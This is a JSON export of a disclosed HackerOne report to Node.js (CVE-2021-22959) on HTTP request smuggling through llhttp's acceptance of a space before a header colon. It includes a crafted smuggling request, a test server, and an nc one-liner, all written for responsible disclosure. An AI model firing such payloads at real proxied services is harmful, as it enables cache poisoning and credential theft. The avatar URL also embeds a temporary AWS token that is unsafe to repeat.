{
  "id": 1238709,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjM4NzA5",
  "url": "https://hackerone.com/reports/1238709",
  "title": "HTTP Request Smuggling due to accepting space before colon",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-06-20T11:10:00.875Z",
  "submitted_at": "2021-06-20T11:10:00.909Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mkg",
    "url": "/mkg",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/iwx0kgzgzxihdnfvh37kc7tmd05j/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58?response-content-disposition=inline%3B%20filename%3D%229297883.jpeg%22%3B%20filename%2A%3DUTF-8%27%279297883.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRSPJQEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141329Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIANREuSO5xRo5uYh9p3fj5lFZASOM0CJaqF9aRTyqP1tAiBMs6gYtXIgibXyOqYUXBJZxA%2Fdza4ke6K%2F%2F0b5E9m1RSqwBQh2EAMaDDAxMzYxOTI3NDg0OSIM8OmUCbC3Pqq1SyEDKo0F3cO4ThOa4uitsGZnpJd4WSWYKi0%2F5mL8qwHwgq3ZuZ1aNUqEK3JGtjDNNtehYQzb3K%2BVzvT15T5E0DeN3sE8NL7KIl3i0Dx5W04t%2FCwofuZVDH6Rwez2OIyLRGEiHKo%2FP%2FkbGO6J7x9mVhWTOKS2bFg4igbBGqP%2Bi2aedUT3vluiB7ukP1cc428RmdmCV%2BuhSI6mu%2Fx6zanZ8MjIY1iRcGFyRSvjl0iN9Apkcqbj2H8R4UNg8b2kqipVUPR0IhWE4Repf%2B6oHnySIQcgKlfP60eivKF7%2BDxEpCbVDsb91wMe67XzEaDtj4q3yEkaR59%2FnN0%2Fg51i8gvLHyAK2aB8UWfJhpojdnN%2FB%2BaF6aGM1Zep47eAH4cQQWhMZ2I26LKQhm7iwRj6IEHbgHd2m6nHPOKHU2uWuHo13GDorNeQWMI%2FABbIu1tC%2FBPGMydY2v4uUNIntKjUUw%2BXSGO9A9lk6BbiANo%2BTxvrgKzjhYstigi28K%2FJy2l%2B50z3nW5D8NMHVXHTF9%2FfZJj2T3gBRe9rfchTv6%2Bbpy1%2Bn8nOxmudj%2B9inUeddHC6rtgTt35Y1V%2FQuDeghaOCTLBIQIRUj2dXMLrSvM6ipTuqtOLpxyjWPKhlGteSd9sRZ2GulqFnPco4IJ18%2Fn03rD%2FZTFvntG5nnCfDUN1rKUSiHRLc%2Be2fxn1LToFrzjJFDRvOSJIM%2FpzLFcAYL8tTTyFBkIKfd049EasT8fD7XkmUkbP9SU%2Fz3oask16Cc%2FxTEDv733bE%2B2WRdqbzle4n0HY%2F8WFiXHg%2FcBG11MfaIEqM74wTZ5xO8lGQRD8qVunQROTT4innfbTfWRrrpjWEVYNiOx7p4%2BZ0qgpFMn9%2F3hcTkdABX%2BMwpcOtrgY6sgEIuPpZKWB6MctyieUs6Zf8b%2FX4IKPm%2BfhMeS2tI0il7r2OReIXdjDVkC4sQOPEZhbn%2BDfZAXOoMl6LPgx5C10nOg8D%2BTLxqQZt9rcPO7a6NY6DuIvhZo5c4RdVjEGuOfc%2FAROg4UmbOf0zkue94sBg8VslzPwR4H20rwyBYQqkWxtaGVbZKYCCbNb6IEpuSkgMadMJvwHOmUUOWS2k1Jnl6yQZixJKKroR7DQEK1J3Lebd&X-Amz-SignedHeaders=host&X-Amz-Signature=136e82053de75d87086eda927a07e8d25359cc888956517335bc300d412ed51f"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2021-22959"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-10-20T14:58:11.063Z",
  "bug_reporter_agreed_on_going_public_at": "2021-10-20T14:58:10.998Z",
  "team_member_agreed_on_going_public_at": "2021-10-15T12:40:40.728Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nThe ``llhttp`` parser in the ``http``module in Node 16.3.0 accepts requests with a space (SP) right after the header name before the colon. This can lead to HTTP Request Smuggling (HRS).\n\n**Description:**\nWhen Node receives the following request:\n\n```\nGET / HTTP/1.1\nHost: localhost:5000\nContent-Length : 5\n\nhello\n```\n\nIt interprets the request as having the body `hello`. Here is the relevant section of the code: https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L410-L415\n\nHow could this lead to HRS? Imagine that Node is placed behind a proxy which ignores the CL header with a space before the colon, but forwards it as is. Then the following attack can be performed:\n\n```\nGET / HTTP/1.1\nHost: localhost:5000\nContent-Length : 23\n\nGET / HTTP/1.1\nDummy: GET /smuggled HTTP/1.1\nHost: localhost:5000\n\n```\n\nThe proxy would see the first and the second GET-request. But Node would see the first and the third GET-request.\n\n## Steps To Reproduce:\n\nWe don't know of any proxy that behaves this way, but here is how to show that Node is behaving in the described way. Run the following code like this: `node app.js`\n\n```js\nconst http = require('http');\n\n// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/\n\nhttp.createServer((request, response) => {\n  let body = [];\n  request.on('error', (err) => {\n    response.end(\"error while reading body: \" + err)\n}).on('data', (chunk) => {\n    body.push(chunk);\n}).on('end', () => {\n    body = Buffer.concat(body).toString();\n\n    response.on('error', (err) => {\n        response.end(\"error while sending response: \" + err)\n    });\n\n    response.end(\"Body length: \" + body.length.toString() + \" Body: \" + body);\n  });\n}).listen(5000);\n```\n\nThen send a request with a space between the CL header and the colon. This can be done with the following one-liner:\n\n```sh\necho -en \"GET / HTTP/1.1\\r\\nHost: localhost:5000\\r\\nContent-Length : 5\\r\\n\\r\\nhello\" | nc localhost 5000\n```\n\nSee that Node interpreted the body as `hello`.\n\n# Supporting Material/References:\n\nRelevant section of RFC 7230 (second paragraph of https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4):\n\n```\n   No whitespace is allowed between the header field-name and colon.  In\n   the past, differences in the handling of such whitespace have led to\n   security vulnerabilities in request routing and response handling.  A\n   server MUST reject any received request message that contains\n   whitespace between a header field-name and colon with a response code\n   of 400 (Bad Request).  A proxy MUST remove any such whitespace from a\n   response message before forwarding the message downstream.\n```\n\n## Impact\n\nDepending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.",
  "bounty_amount": "250.0",
  "formatted_bounty": "$250",
  "weakness": {
    "id": 86,
    "name": "HTTP Request Smuggling"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-11-14T12:40:40.948Z",
  "allow_singular_disclosure_after": -70939968.71743456,
  "singular_disclosure_allowed": true,
  "vote_count": 17,
  "voters": [
    "fqdn",
    "akashhamal0x01",
    "sodium_",
    "sa1tama0",
    "cryptographer",
    "taha556",
    "rroohhiitt",
    "ax_pax",
    "biyiklioglu",
    "jrcarlooss2",
    "and 7 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
